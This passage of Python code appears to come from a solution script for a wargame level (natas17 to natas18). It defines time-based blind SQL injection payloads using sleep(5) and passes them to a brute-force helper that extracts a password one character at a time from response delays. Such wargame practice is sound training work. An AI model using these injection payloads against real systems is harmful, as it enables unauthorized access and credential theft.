...
match_query = 'natas18" and if(password like binary "%{data}%", sleep(5), 1) #'
query = 'natas18" and if(password like binary "{data}%", sleep(5), 1) #'
func: typing.Callable[[requests.Response, bs4.BeautifulSoup], bool] = lambda response, soup: response.elapsed.total_seconds() >= 5

result = brute_force(website=website, post_mode=True, key="username", query=query, username=username, password=password, check_func=func, match=True, match_query=match_query)
